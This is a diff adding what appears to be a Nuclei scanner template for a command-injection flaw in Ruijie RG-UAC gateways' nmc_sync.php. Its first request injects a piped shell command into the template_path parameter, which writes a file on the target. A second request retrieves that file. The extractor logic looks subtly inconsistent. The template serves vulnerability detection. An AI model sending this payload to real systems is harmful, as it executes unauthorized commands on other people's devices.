@@ -1,0 +1,38 @@
+id: ruijie-nmc-sync-rce
+info:
+  name: Ruijie nmc_sync.php Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The Ruijie RG-UAC application management gateways have a command execution vulnerability in the nmc_sync.php file. Attackers can exploit this vulnerability to execute arbitrary commands on the server.
+  metadata:
+    cvss-score: 9.0
+    tags: rce,command-execution
+http:
+  - raw:
+      - |
+        GET /view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|ls%20>{{randstr}}.txt|cat HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: randname
+        group: 1
+        regex:
+          - "{{randstr}}"
+        internal: true
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /view/systemConfig/management/{{randname}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "nmc_sync.php"
+    matchers-condition: and
